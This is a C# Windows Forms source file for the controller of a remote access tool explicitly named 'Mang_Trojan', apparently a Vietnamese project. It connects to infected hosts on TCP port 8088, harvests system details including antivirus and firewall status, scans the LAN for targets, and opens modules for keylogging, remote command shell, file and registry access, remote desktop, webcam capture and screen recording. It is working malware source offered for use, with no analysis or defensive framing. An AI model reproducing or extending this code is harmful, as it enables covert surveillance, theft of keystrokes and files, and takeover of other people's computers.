using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Runtime.Remoting.Channels.Http;
using System.Net;
using System.Runtime.Remoting.Messaging;
using System.Drawing.Imaging;
using System.Threading;
using RemoteObject;
using System.Diagnostics;
namespace Mang_Trojan.form
{
    public partial class Main : Form
    {
        #region variable
        TcpChannel channel = new TcpChannel();
        ScreenObject hostInstance;
        bool connected = false;
        ListViewItem listViewItem;
        ListViewItem.ListViewSubItem listSubItem;

        bool is_trial;
        #endregion
        public Main(bool is_trial)
        {
            InitializeComponent();
            this.is_trial = is_trial;
        }

        private void btConnect_Click(object sender, EventArgs e)
        {
            ConnectToServer();
        }
        public void ConnectToServer()
        {
            if (IsAddressValid(tbServerIP.Text))
            {
                if (connected == false)
                {
                    try
                    {

                        ChannelServices.RegisterChannel(channel, false);
                        //thuoc tinh nay chi dc set 1 lan,vi the neu co,khi disconnect va connect ->error
                        // RemotingConfiguration.CustomErrorsMode = CustomErrorsModes.Off;                      
                        hostInstance = (ScreenObject)Activator.GetObject(typeof(ScreenObject), "tcp://" + tbServerIP.Text + ":8088/ScreenObject");
                        //   hostInstance = new ScreenObject();


                        MessageBox.Show("Connected to " + hostInstance.GetComputerName() + ":8088");

                        btActivePort.Enabled = true;
                        btClipBoard.Enabled = true;
                        btCMD.Enabled = true;

                        btFileManager.Enabled = true;
                        btFun.Enabled = true;
                        btInstall.Enabled = true;
                        btKeylogger.Enabled = true;
                        btProgram.Enabled = true;
                        btRegistry.Enabled = true;
                        btRemoteDesktop.Enabled = true;
                        btService.Enabled = true;
                        btStartup.Enabled = true;
                        btSystemInfo.Enabled = true;
                        btWindow.Enabled = true;
                        btAbout.Enabled = true;
                        btConnect.Text = "Disconnect";
                        btCamera.Enabled = true;
                        btRecord.Enabled = true;
                        tbServerIP.Enabled = false;
                        connected = true;

                        //system info 
                        listViewItem = new ListViewItem();
                        listViewItem.Text = tbServerIP.Text;

                        listSubItem = new ListViewItem.ListViewSubItem();
                        listSubItem.Text = hostInstance.GetComputerName();
                        listViewItem.SubItems.Add(listSubItem);

                        listSubItem = new ListViewItem.ListViewSubItem();
                        listSubItem.Text = hostInstance.GetUserName();
                        listViewItem.SubItems.Add(listSubItem);

                        listSubItem = new ListViewItem.ListViewSubItem();
                        listSubItem.Text = hostInstance.GetOSVersion();
                        listViewItem.SubItems.Add(listSubItem);

                        listSubItem = new ListViewItem.ListViewSubItem();
                        listSubItem.Text = hostInstance.GetRam();
                        listViewItem.SubItems.Add(listSubItem);

                        listSubItem = new ListViewItem.ListViewSubItem();
                        listSubItem.Text = hostInstance.GetAntiVirus();
                        //test cho win xp
                        // listSubItem.Text = "Bkav";
                        listViewItem.SubItems.Add(listSubItem);

                        listSubItem = new ListViewItem.ListViewSubItem();
                        listSubItem.Text = hostInstance.GetFirewall();
                        //test cho winxp
                        //listSubItem.Text = "Firewall";
                        listViewItem.SubItems.Add(listSubItem);

                        this.listViewServers.Items.Add(listViewItem);
                    }
                    catch (Exception ex)
                    {

                        MessageBox.Show(ex.Message);
                        //Unregister the TCP Channel
                        ChannelServices.UnregisterChannel(channel);

                    }
                }
                else if (connected == true)
                {
                    //Unregister the TCP Channel
                    ChannelServices.UnregisterChannel(channel);
                    listViewServers.Items.Clear();
                    connected = false;
                    btConnect.Text = "Connect";
                    btActivePort.Enabled = false;
                    btClipBoard.Enabled = false;
                    btCMD.Enabled = false;

                    btFileManager.Enabled = false;
                    btFun.Enabled = false;
                    btInstall.Enabled = false;
                    btKeylogger.Enabled = false;
                    btProgram.Enabled = false;
                    btRegistry.Enabled = false;
                    btRemoteDesktop.Enabled = false;
                    btService.Enabled = false;
                    btStartup.Enabled = false;
                    btSystemInfo.Enabled = false;
                    btWindow.Enabled = false;
                    btAbout.Enabled = false;
                    btCamera.Enabled = false;
                    btRecord.Enabled = false;
                    tbServerIP.Enabled = true;

                }
            }
            else
            {
                MessageBox.Show("Invalid IP Address");
            }
        }

        public bool IsAddressValid(string addrString)
        {
            IPAddress address;
            return IPAddress.TryParse(addrString, out address);
        }

        private void btSystemInfo_Click(object sender, EventArgs e)
        {
            SystemInfo systemInfo = new SystemInfo(hostInstance,tbServerIP.Text);
            systemInfo.Show();
        }

        private void btActivePort_Click(object sender, EventArgs e)
        {
            ActivePorts activePort = new ActivePorts(hostInstance);
            activePort.Show();
        }

        private void btProgram_Click(object sender, EventArgs e)
        {
              
            Programs programForm = new Programs(hostInstance);
            programForm.Show();
        }

        private void btService_Click(object sender, EventArgs e)
        {
            Services serviceForm = new Services(hostInstance);
            serviceForm.Show();
        }

        private void btFun_Click(object sender, EventArgs e)
        {
            Fun funForm = new Fun(hostInstance);
            funForm.Show();
        }

        private void btFileManager_Click(object sender, EventArgs e)
        {
            FileManager fileMngForm = new FileManager(hostInstance);
            fileMngForm.Show();
        }

        private void btRegistry_Click(object sender, EventArgs e)
        {
            RegistryEditor registryForm = new RegistryEditor(hostInstance);
            registryForm.Show();
        }

        private void btRemoteDesktop_Click(object sender, EventArgs e)
        {
            RemoteDesktop remoteDeskForm = new RemoteDesktop(hostInstance);
            remoteDeskForm.Show();
        }

        private void btCMD_Click(object sender, EventArgs e)
        {
            RemoteCMD cmdForm = new RemoteCMD(hostInstance);
            cmdForm.Show();
        }

        private void btStartup_Click(object sender, EventArgs e)
        {
            StartupManager StartupForm = new StartupManager(hostInstance);
            StartupForm.Show();
        }

        private void btInstall_Click(object sender, EventArgs e)
        {
            IntallerProgram IntallProForm = new IntallerProgram(hostInstance);
            IntallProForm.Show();
        }

        private void btClipBoard_Click(object sender, EventArgs e)
        {
            ClipBoard clipb = new ClipBoard(hostInstance);
            clipb.Show();
        }

        private void btWindow_Click(object sender, EventArgs e)
        {
            Windows windowForm = new Windows(hostInstance);
            windowForm.Show();
        }

        private void btKeylogger_Click(object sender, EventArgs e)
        {
            KeyLogger keylogForm = new KeyLogger(hostInstance);
            keylogForm.Show();
        }

        private void tbServerIP_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            About formAb = new About();
            formAb.Show();
        }

        private void btScan_Click(object sender, EventArgs e)
        {
           // string WORKING_DIR = Environment.CurrentDirectory + "\\netscan";

           // ProcessStartInfo psi = new ProcessStartInfo();
           // Process  p = new Process();
           // psi.WindowStyle = ProcessWindowStyle.Hidden;
           // psi.WorkingDirectory = WORKING_DIR;
           // psi.FileName = WORKING_DIR+"\\NetBIOSEnumerater.exe";
           // psi.UseShellExecute = false;
          
          
           
           // p.StartInfo = psi;
           //// p.EnableRaisingEvents = true;
           
           // p.Start();
           // //System.Diagnostics.Process.Start(lanscanpath);
            NetPing.MainForm frmScanLan = new NetPing.MainForm();
            frmScanLan.IpUpdated += new NetPing.MainForm.IpUpdatedHandler(ScanLanForm_ButtonClicked);
            frmScanLan.ShowDialog();
            ConnectToServer();
        }
        // handles the event from frmId
        private void ScanLanForm_ButtonClicked(object sender, String e)
        {
            // update the forms values from the event args
            tbServerIP.Text = e.ToString();
           
           
        }

        private void btCamera_Click(object sender, EventArgs e)
        {
            Camera formCamera = new Camera(tbServerIP.Text);
            formCamera.Show();
        }

        private void btRecord_Click(object sender, EventArgs e)
        {
            if (!is_trial)
            {
                Record formRecord = new Record(tbServerIP.Text, hostInstance);
                //RecordClient formRecord = new RecordClient();
                formRecord.Show();
            }
            else
            {
                MessageBox.Show("Chức năng này không chạy ở chế độ dùng thử");
            }
        }

        
    }
}
